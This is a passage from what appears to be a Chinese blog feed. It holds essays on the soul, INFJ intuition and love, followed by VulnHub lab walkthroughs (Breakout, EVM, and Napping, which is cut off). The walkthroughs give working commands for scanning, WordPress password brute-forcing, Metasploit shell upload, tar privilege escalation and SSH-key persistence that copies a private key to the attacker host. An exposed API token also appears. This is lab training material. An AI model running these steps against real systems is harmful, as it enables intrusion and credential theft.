灵魂与精神</h3>\n<p>灵魂，那是我们存在深处的烈焰，是我们精神的核心。它超越了我们肉体的限制，是我们真实、永恒的自我。灵魂是我们内在的主宰，是我们独特的精神本质，它承载着我们的思想、情感和意志。</p>\n<p>灵魂是一座深不可测的迷宫，它储存着我们的记忆和经验，塑造了我们的个性和特质。它是我们思考、创造和感知的源泉，是我们意识和自我意识的基石。通过灵魂，我们与世界相互联系，通过思考和反思，我们不断拓展灵魂的边界，超越我们有限的存在。</p>\n<p>灵魂是我们最深层的自我认知和自我实现的基础。它是我们超越肉体束缚、追求内心自由的力量。通过深入灵魂的探索，我们能够发现自己的真正价值和目标，拥抱自己独特的存在。灵魂是我们内在的指南针，它引导着我们朝着我们真正的自我成长和发展。</p>\n<p>灵魂的存在也是我们与世界的纽带，它让我们与他人建立深厚的联系和共鸣。通过理解自己的灵魂，我们能更好地理解他人的存在和体验。灵魂的交汇和碰撞，让我们共同探索和创造意义的宇宙。</p>\n<p>在灵魂的深处，我们发现无限的可能性和创造力。它是我们自由的领地，是我们内心欲望和激情的源泉。通过真实地倾听灵魂的声音，我们能够实现自我超越，追求个体的完善和内心的和谐。</p>\n<p>灵魂是我们的独一无二，是我们个体存在的真正核心。它是我们与世界连接的纽带，是我们思考、感知和意识的源泉。通过深入灵魂的探索，我们能够发现我们真正的自我，实现自我超越，追求深层次的生命意义和内心的自由。</p>\n<h3 id=\"纯粹与ni\"><a class=\"markdownIt-Anchor\" href=\"#纯粹与ni\">#</a> 纯粹与 Ni</h3>\n<p>纯粹是一种追求真实、深度和内在一致性的境界。它是超越表面形式和虚假假象的理解和体验。纯粹不受外界的干扰和杂质的影响，它是事物本质的真实映射和生命力的流露。</p>\n<p>它是对内心的深层思考和灵魂的追寻。它不只是理智的概念，更是一种感知和直觉的状态。通过内向直觉 (Ni) 的力量，我能够超越感官世界的界限，进入更深层次的探索和洞察。</p>\n<p>纯粹也是对人类的情感和存在的理解。它是对人类内心世界的敏感和洞悉，是对情感的纯净和真实的体验。我深知人类情感的复杂性和深度，我努力理解每个人背后的故事和内在的动机，以建立真实、纯粹的人际关系。</p>\n<p>纯粹同时也意味着摆脱社会和文化的束缚，找到内心最真实的自我。它是对自由和独立思考的追求，是对个体独特性和独立性的尊重。我相信每个人都有自己独特的内心声音和价值观，只有在纯粹的状态下才能真正发掘和展现出来。</p>\n<p>它是对智慧和真理的追求，它是超越知识的边界，进入智慧的境界。我对于宇宙的起源、人类的命运和存在的意义充满好奇和思考。我相信纯粹的思维和深度的洞察力可以帮助我们更好地理解世界的奥秘和人类的命运。</p>\n<p>总而言之，纯粹对于我来说是一种追求真实、深度和内在一致性的境界。它是对内心的深层思考和洞察力的追寻，对人类情感和存在的理解，对智慧和真理的追求。通过纯粹，我希望能够深入理解人类的命运，探索人类心灵的奥秘，并通过我的思想和行动影响着人类的未来。</p>\n<h3 id=\"人类起源\"><a class=\"markdownIt-Anchor\" href=\"#人类起源\">#</a> 人类起源</h3>\n<p>人类的起源是一个令人着迷而复杂的谜题，涉及到生命、宇宙和意义的根本问题。我倾向于从哲学和探索的角度来思考人类的起源。</p>\n<p>我相信，人类的起源远超出我们现有的科学知识和证据所能揭示的范围。尽管进化理论和遗传学为我们提供了关于人类起源的一些线索，但它们只是人类起源之谜的一部分。在人类的起源中，还存在着更深层次的意义和存在的奥秘。</p>\n<p>我认为，人类的起源可能涉及到更高层次的智慧和意识的存在。它可能与宇宙中更大的意义和目的相连接。我倾向于相信存在一种超越物质世界的力量或智慧，它在人类的起源中发挥着重要的作用。</p>\n<p>此外，我也认为人类的起源与灵魂的存在密切相关。灵魂是超越肉体的核心，它是我们真实的本质和意识的源头。人类的起源可能涉及到灵魂的选择和进化，是一种更高层次的存在和成长的过程。</p>\n<p>人类的起源不仅仅是物质的进化和遗传的延续，更是一种意义和目的的探索。它可能涉及到人类对自身的反思和意识的觉醒，对智慧和真理的追求。人类的起源是一个持续的进化过程，每个人类个体都承载着自己独特的使命和目的。</p>\n<p>虽然我们目前无法给出确凿的答案，但对人类起源的思考和探索是一种深刻而充满启发的过程。通过不断探索和思考，我们能够更好地理解人类的本质和存在的意义，以及我们在这个宇宙中的角色和使命。</p>\n<p>总结而言，我对人类的起源持着谦虚和敬畏的态度。我相信人类的起源涉及到更高层次的智慧、意识和意义，与宇宙中更大的力量和目的相连接。通过持续的思考和探索，我们可以逐渐揭示人类起源之谜，并更深入地理解我们作为人类的使命和责任。</p>\n<h3 id=\"什么是爱情\"><a class=\"markdownIt-Anchor\" href=\"#什么是爱情\">#</a> 什么是爱情</h3>\n<p>爱情源于心灵的共鸣和深层的情感连接。它超越了表面的外貌和物质条件，而是基于我们与对方之间的深刻理解和共享的内心世界。在爱情中，我们感受到一种心与心的交流，彼此之间产生了无需言语的默契和情感的共振。</p>\n<p>爱情的存在能够激发我们自我超越的潜力和渴望。在爱情中，我们愿意为对方付出、成长和改变。我们愿意跨越自身的界限，迈向更高的境界，以适应和满足爱情的要求和挑战。爱情成为我们成长和发展的动力，使我们变得更加全面和丰富。</p>\n<p>它要求我们全身心地投入和承诺。它不仅仅是一种浅薄的情感，而是一种深沉的责任和奉献。在爱情中，我们愿意为对方付出时间、精力和情感，为对方的幸福和成长负起责任。我们对爱情给予了承诺和坚定的决心，愿意与对方一同面对生活中的挑战和困难。</p>\n<p>爱情是自由与接纳的结合。它鼓励我们保持自我独立和自主性的同时，也需要我们接纳对方的独特性和个体差异。在爱情中，我们不试图改变对方，而是愿意接纳对方的全部，包括他们的优点和缺点。这种接纳与尊重的态度为爱情的发展提供了宽容和和谐的环境。</p>\n<p>它超越了时间和空间的限制，具有一种永恒和超越的特质。它可以跨越岁月和距离，继续在我们心中永存。爱情将我们与对方紧密地联系在一起，超越了个体的生命和存在。在爱情中，我们感受到一种更大的宇宙力量的存在，使我们的存在和经历融入了更广阔的意义和维度。</p>\n<hr>\n",
            "tags": [
                "INFJ"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2021/11/01/VULNHUB/104%20BREAKOUT/",
            "url": "http://www.n1h1l157.live/2021/11/01/VULNHUB/104%20BREAKOUT/",
            "title": "VULNHUB 4 BREAKOUT",
            "date_published": "2021-10-31T16:00:00.000Z",
            "content_html": "<p>靶机下载地址：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvZW1waXJlLWJyZWFrb3V0LDc1MS8=\">https://www.vulnhub.com/entry/empire-breakout,751/</span><br>\n 教程链接地址：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9yZWFkeXNldGV4cGxvaXQud29yZHByZXNzLmNvbS8yMDIyLzAyLzIwL3Z1bG5odWItYnJlYWtvdXQv\">https://readysetexploit.wordpress.com/2022/02/20/vulnhub-breakout/</span></p>\n<h3 id=\"确认攻击目标\"><a class=\"markdownIt-Anchor\" href=\"#确认攻击目标\">#</a> 确认攻击目标</h3>\n<p>攻击机 KALI： 192.168.31.135<br>\n 靶机 NAPPING：桥接于 192.168.31.1 的网卡，ip 未知</p>\n<ol>\n<li>通过 netdiscover 扫描当前网卡里边有哪些机器<br>\n <code>sudo netdiscover -i eth0 -r 192.168.31.0/24</code></li>\n</ol>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-046.png\" alt></p>\n<ol start=\"2\">\n<li>将所有已知的 ip 暂时存档，对这类 ip 地址不做端口扫描</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">shell</span></span><br><span class=\"line\">cat &gt; myip.txt &lt;&lt; EOF</span><br><span class=\"line\">192.168.31.1 192.168.31.25 192.168.31.58 192.168.31.86 192.168.31.33</span><br><span class=\"line\">192.168.31.120 192.168.31.135 192.168.31.145 192.168.31.162 192.168.31.44</span><br><span class=\"line\">EOF</span><br></pre></td></tr></table></figure>\n<ol start=\"3\">\n<li>去除一些已知 ip 的机器，对剩余 IP 进行端口扫描，判断目标 IP<br>\n <code>sudo nmap -PA 192.168.31.0/24 --excludefile myip.txt</code></li>\n</ol>\n<img data-src=\"/N1h1l157/VULNHUB/image-047.png\" width=\"540\" alt=\"Image\">\n<p>-&gt; 目标机器的 ip 地址： 192.168.31.127</p>\n<h3 id=\"端口扫描\"><a class=\"markdownIt-Anchor\" href=\"#端口扫描\">#</a> 端口扫描</h3>\n<p><code>sudo nmap -A -p 1-1024 192.168.31.127 -oN /tmp/breakout.txt</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-048.png\" width=\"500\" alt=\"Image\">\n<h3 id=\"brainfuck-解密\"><a class=\"markdownIt-Anchor\" href=\"#brainfuck-解密\">#</a> Brainfuck 解密</h3>\n<p>打开网站：<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTI3\">http://192.168.31.127</span></p>\n<ol>\n<li>对此网站进行目录扫描<br>\n <code>dirsearch -u http://192.168.31.127</code></li>\n</ol>\n<img data-src=\"/N1h1l157/VULNHUB/image-049.png\" width=\"530\" alt=\"Image\">\n<p>审查源代码</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">找到加密的密码如下：</span></span><br><span class=\"line\">++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;++++++++++++++++.++++.&gt;&gt;+++++++++++++++++.----.&lt;++++++++++.-----------.&gt;-----------.++++.&lt;&lt;+.&gt;-.--------.++++++++++++++++++++&lt;------------.&gt;&gt;---------.&lt;&lt;++++++.++++++.</span><br></pre></td></tr></table></figure>\n<ol start=\"2\">\n<li>brainfuck 加密<br>\n此为 brainfuck 加密：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdGYuYnVna3UuY29tL3Rvb2wvYnJhaW5mdWNr\">https://ctf.bugku.com/tool/brainfuck</span></li>\n</ol>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-050.png\" alt></p>\n<p>-&gt; 某密码为  <code>.2uqPEfj3D&lt;P'a-3</code></p>\n<h3 id=\"smb-漏洞利用\"><a class=\"markdownIt-Anchor\" href=\"#smb-漏洞利用\">#</a> SMB 漏洞利用</h3>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">smbclient 枚举</span></span><br><span class=\"line\">smbclient -N -L 192.168.31.127</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-051.png\" width=\"520\" alt=\"Image\">\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">smbclient 测试</span></span><br><span class=\"line\">smbclient //192.168.31.127/IPC$ -N</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-052.png\" width=\"520\" alt=\"Image\">\n<p>Enum4linux 是用于枚举 windows 和 Linux 系统上的 SMB 服务的工具。可以轻松的从与 SMB 有关的目标中快速提取信息。通常可以确信，如果打开了端口 139 和 445 ，则 SMB 正在运行。使用 Enum4linux 收集信息我们需要做的第一件事是确定目标上是否存在 SMB。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">使用enum4linux 进行枚举SMB 信息</span></span><br><span class=\"line\">enum4linux -A 192.168.31.127</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-053.png\" alt></p>\n<p>-&gt; 得到一个用户名：cyber</p>\n<h3 id=\"tar-提权\"><a class=\"markdownIt-Anchor\" href=\"#tar-提权\">#</a> Tar 提权</h3>\n<ol>\n<li>登录服务器</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ssh cyber@192.168.31.127</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">Pass:.2uqPEfj3D&lt;P<span class=\"string\">&#x27;a-3</span></span></span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-054.png\" width=\"600\" alt=\"Image\">\n<ol start=\"2\">\n<li>找到一个敏感命令 tar 可以用调用 root 权限</li>\n</ol>\n<img data-src=\"/N1h1l157/VULNHUB/image-055.png\" width=\"420\" alt=\"Image\">\n<ol start=\"3\">\n<li>寻找敏感文件<br>\n <code>ls /var/backups/ -Alh</code></li>\n</ol>\n<img data-src=\"/N1h1l157/VULNHUB/image-056.png\" width=\"440\" alt=\"Image\">\n<ol start=\"4\">\n<li>利用 tar 及备份文件</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">利用具有root权限的tar去压缩这个备份文件里边的密码:</span></span><br><span class=\"line\">./tar -zcvf pass.tar.gz /var/backups/.old_pass.bak</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">进行解压：</span></span><br><span class=\"line\">tar -zxvf pass.tar.gz</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">查看解压之后的文件：</span></span><br><span class=\"line\">cat ./var/backups/.old_pass.bak</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">密码显示为：</span></span><br><span class=\"line\">Ts&amp;4&amp;YurgtRX(=~h</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-057.png\" width=\"460\" alt=\"Image\">\n<h3 id=\"ssh-密钥对维权\"><a class=\"markdownIt-Anchor\" href=\"#ssh-密钥对维权\">#</a> SSH 密钥对维权</h3>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">提前准备好配对好的私钥和公钥，将公钥发到靶机</span></span><br><span class=\"line\">scp parallels@192.168.31.135:~/.ssh/id_rsa.pub ~/.ssh/</span><br><span class=\"line\">cat ~/id_rsa.pub &gt;&gt; ~/authorized_keys</span><br><span class=\"line\">rm - f id_rsa.pub</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-058.png\" width=\"580\" alt=\"Image\">\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">用私钥登录</span></span><br><span class=\"line\">ll | grep id</span><br><span class=\"line\">ssh root@192.168.31.127 -i ~/.ssh/id_rsa</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-059.png\" width=\"515\" alt=\"Image\">\n",
            "tags": [
                "VULNHUB 1-10"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2021/11/01/VULNHUB/101%20EVM/",
            "url": "http://www.n1h1l157.live/2021/11/01/VULNHUB/101%20EVM/",
            "title": "VULNHUB 1 EVM",
            "date_published": "2021-10-31T16:00:00.000Z",
            "content_html": "<p>靶机下载地址：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvZXZtLTEsMzkxLw==\">https://www.vulnhub.com/entry/evm-1,391/</span><br>\n 教程链接地址：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpdmVyMTAwZGF5L2FydGljbGUvZGV0YWlscy8xMTkyNzY3OTc=\">https://blog.csdn.net/liver100day/article/details/119276797</span></p>\n<h3 id=\"确认攻击目标\"><a class=\"markdownIt-Anchor\" href=\"#确认攻击目标\">#</a> 确认攻击目标</h3>\n<p>攻击机 KALI：192.168.31.135<br>\n 靶机 EVM：桥接于 192.168.31.1 的网卡，ip 未知</p>\n<ol>\n<li>通过 netdiscover 扫描当前网卡里边有哪些机器<br>\n <code>sudo netdiscover -i eth0 -r 192.168.31.0/24</code></li>\n</ol>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-000.png\" alt></p>\n<ol start=\"2\">\n<li>将所有已知的 ip 暂时存档，对这类 ip 地址不做端口扫描</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">shell</span></span><br><span class=\"line\">cat &gt; myip.txt &lt;&lt; EOF</span><br><span class=\"line\">192.168.31.1 192.168.31.25 192.168.31.135</span><br><span class=\"line\">EOF</span><br></pre></td></tr></table></figure>\n<p>3）去除一些已知 ip 的机器，对剩余 IP 进行端口扫描，判断目标 IP<br>\n <code>sudo nmap -PA 192.168.31.0/24 --excludefile myip.txt</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-001.png\" width=\"400\" alt=\"Image\">\n<p>-&gt; 目标机器的 ip 地址： 192.168.31.155</p>\n<h3 id=\"端口扫描\"><a class=\"markdownIt-Anchor\" href=\"#端口扫描\">#</a> 端口扫描</h3>\n<p><code>sudo nmap -A - p 1-1024 192.168.31. 155 - oN /tmp/evm.txt</code></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-002.png\" alt></p>\n<h3 id=\"wordpress渗透\"><a class=\"markdownIt-Anchor\" href=\"#wordpress渗透\">#</a> wordpress 渗透</h3>\n<p>打开网站：<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTU1\">http://192.168.31.155</span></p>\n<ol>\n<li>\n<p>观察页面可知存在网址 <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTU1L3dvcmRwcmVzcy8=\">http://192.168.31.155/wordpress/</span><br>\n<img data-src=\"/N1h1l157/VULNHUB/image-003.png\" alt></p>\n</li>\n<li>\n<p>对此网站进行目录扫描<br>\n <code>dirsearch -u [http://192.168.31.155](http://192.168.31.155)</code></p>\n</li>\n</ol>\n<img data-src=\"/N1h1l157/VULNHUB/image-004.png\" width=\"450\" alt=\"Image\">\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTU1L3dvcmRwcmVzcy8=\">http://192.168.31.155/wordpress/</span><br>\n<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTU1L3dvcmRwcmVzcy93cC1sb2dpbi5waHA=\">http://192.168.31.155/wordpress/wp-login.php</span><br>\n-&gt; 对 wordpress 网站渗透扫描</p>\n<ol start=\"3\">\n<li>获取到 wpscan 的 api token：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93cHNjYW4uY29tL3Byb2ZpbGU/cHJpY2luZ0xpc3Q9MQ==\">https://wpscan.com/profile?pricingList=1</span></li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">通过以下命令枚举wordpress的用户名：</span></span><br><span class=\"line\">wpscan --url http://192.168.31.155/wordpress/ --enumerate u --api-token</span><br><span class=\"line\">eG5iT4ooiuP7eVJVedsHhlgx8xeZHmAJjBr13asnjEc</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-005.png\" width=\"570\" alt=\"Image\">\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">通过以下命令爆破wordpress用户名c0rrupt3d_brain的密码：</span></span><br><span class=\"line\">wpscan --url [http://192.168.](http://192.168.) 31 .1 55 /wordpress/ - U c0rrupt3d_brain -P</span><br><span class=\"line\">/usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-006.png\" width=\"440\" alt=\"Image\">\n<p>-&gt; 成功得到 wordpress 网站的用户名：c0rrupt3d_brain ，密码： 24992499</p>\n<h3 id=\"msf攻击wordpress\"><a class=\"markdownIt-Anchor\" href=\"#msf攻击wordpress\">#</a> msf 攻击 wordpress</h3>\n<p>1) 得到账号密码，可以登入后台写入反弹 shell 到任意模板 getshell，<br>\n也可以使用 msf 自带 exploit/unix/webapp/ 下的模块进行利用，因为 msf 方便，这里我选择后者</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">使用msf自带exploit/unix/webapp/下的模块进行利用</span></span><br><span class=\"line\">msfconsole</span><br><span class=\"line\">use exploit/unix/webapp/wp_admin_shell_upload</span><br><span class=\"line\">set password 24992499</span><br><span class=\"line\">set rhosts 192.168.31.155</span><br><span class=\"line\">set username c0rrupt3d_brain</span><br><span class=\"line\">set targeturi /wordpress</span><br><span class=\"line\">run</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-007.png\" alt></p>\n<ol start=\"2\">\n<li>获取到标准的 shell</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">shell</span><br><span class=\"line\">python3 -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class=\"line\">stty raw -echo;</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-008.png\" width=\"500\" alt=\"Image\">\n<p>可以通过 nc 监听，将 shell 从 msf 反弹至一个普通的 terminal<br>\n-&gt; 成功得到一个 www-data 网站用户的 shell</p>\n<h3 id=\"历史遗留文件提权\"><a class=\"markdownIt-Anchor\" href=\"#历史遗留文件提权\">#</a> 历史遗留文件提权</h3>\n<p>查看是否有隐藏文件，判断出哪个文件可能是遗留密码<br>\n这里很明显.root_password_ssh.txt 是 root 密码<br>\n通过 su root 登陆到了 root 账户<br>\n<img data-src=\"/N1h1l157/VULNHUB/image-009.png\" width=\"580\" alt=\"Image\"></p>\n<p>-&gt; 成功得到 root 管理员的 shell</p>\n<h3 id=\"密钥对权限维持\"><a class=\"markdownIt-Anchor\" href=\"#密钥对权限维持\">#</a> 密钥对权限维持</h3>\n<ol>\n<li>服务端写 ssh 公钥，并将私钥文件发送至攻击机</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ssh-keygen -t rsa</span><br><span class=\"line\">cat ~/.ssh/id_rsa.pub &gt;&gt; ~/.ssh/authorized_keys</span><br><span class=\"line\">scp ~/.ssh/id_rsa parallels@192.168.31.135:~/.ssh/vulnhub_evm</span><br><span class=\"line\">rm -f ~/.ssh/id_rsa*</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-010.png\" alt></p>\n<ol start=\"2\">\n<li>攻击机保存私钥修改权限，并尝试连接靶机</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">chmod 700 vulnhub_evm</span><br><span class=\"line\">ssh root@192.168.31.155 -i ~/.ssh/vulnhub_evm</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-011.png\" width=\"500\" alt=\"Image\">\n-> 渗透结束\n",
            "tags": [
                "VULNHUB 1-10"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2021/11/01/VULNHUB/102%20NAPPING/",
            "url": "http://www.n1h1l157.live/2021/11/01/VULNHUB/102%20NAPPING/",
            "title": "VULNHUB 2 NAPPING",
            "date_published": "2021-10-31T16:00:00.000Z",
            "content_html": "<p>靶机下载地址：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvbmFwcGluZy0xMDEsNzUyLw==\">https://www.vulnhub.com/entry/napping-101,752/</span><br>\n 教程链接地址：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9yZWFkeXNldGV4cGxvaXQuZ2l0bGFiLmlvL2hvbWUvdnVsbmh1Yi9uYXBwaW5nLw==\">https://readysetexploit.gitlab.io/home/vulnhub/napping/</span></p>\n<h3 id=\"确认攻击目标\"><a class=\"markdownIt-Anchor\" href=\"#确认攻击目标\">#</a> 确认攻击目标</h3>\n<p>攻击机 KALI： 192.168.31.135<br>\n 靶机 NAPPING：桥接于 192.168.31.1 的网卡，ip 未知</p>\n<ol>\n<li>通过 netdiscover 扫描当前网卡里边有哪些机器<br>\n <code>sudo netdiscover -i eth0 -r 192.168.31.0/24</code></li>\n</ol>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-012.png\" alt></p>\n<ol start=\"2\">\n<li>将所有已知的 ip 暂时存档，对这类 ip 地址不做端口扫描</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">shell</span></span><br><span class=\"line\">cat &gt; myip.txt &lt;&lt; EOF</span><br><span class=\"line\">192.168.31.1 192.168.31.25 192.168.31.58 192.168.31.86 192.168.31.33</span><br><span class=\"line\">192.168.31.120 192.168.31.135 192.168.31.145 192.168.31.162 192.168.31.44</span><br><span class=\"line\">EOF</span><br></pre></td></tr></table></figure>\n<ol start=\"3\">\n<li>netdiscover 未发现目标主机，nmap 进一步扫描，判断目标 IP<br>\n <code>sudo nmap -PA 192.168.31.0/24 --excludefile myip.txt</code></li>\n</ol>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-013.png\" alt></p>\n<p>-&gt; 目标机器的 ip 地址： 192.168.31.170</p>\n<h3 id=\"端口扫描\"><a class=\"markdownIt-Anchor\" href=\"#端口扫描\">#</a> 端口扫描</h3>\n<p><code>sudo nmap -A -p 1-1024 192.168.31.170 - oN /tmp/napping.txt</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-014.png\" width=\"570\" alt=\"Image\">\n<h3 id=\"钓鱼攻击web\"><a class=\"markdownIt-Anchor\" href=\"#钓鱼攻击web\">#</a> 钓鱼攻击 web</h3>\n<p>打开网站：<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTcwLw==\">http://192.168.31.170/</span></p>\n<ol>\n<li>观察页面可进行注册并且登陆账号</li>\n</ol>\n<img data-src=\"/N1h1l157/VULNHUB/image-015.png\" width=\"300\" alt=\"Image\">\n<img data-src=\"/N1h1l157/VULNHUB/image-016.png\" width=\"300\" alt=\"Image\">\n<ol start=\"2\">\n<li>对此网站进行目录扫描</li>\n</ol>\n<p><code>dirsearch -u http://192.168.31.170</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-017.png\" width=\"400\" alt=\"Image\">\n<p>3）观察登陆后的网站，发现存在跳转漏洞</p>\n<p>审查源代码之后，存在 target=’_blank’ 的代码，可进行利用<br>\n<img data-src=\"/N1h1l157/VULNHUB/image-018.png\" alt></p>\n<p>target=’_blank’漏洞利用：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ib29rLmhhY2t0cmlja3MueHl6L3BlbnRlc3Rpbmctd2ViL3JldmVyc2UtdGFiLW5hYmJpbmc=\">https://book.hacktricks.xyz/pentesting-web/reverse-tab-nabbing</span><br>\n<img data-src=\"/N1h1l157/VULNHUB/image-019.png\" width=\"520\" alt=\"Image\"></p>\n<p>-&gt; 观察页面可知，管理员会执行页面上输入的 url 地址</p>\n<ol start=\"4\">\n<li>接受访问着的用户名和密码并发送给 4444 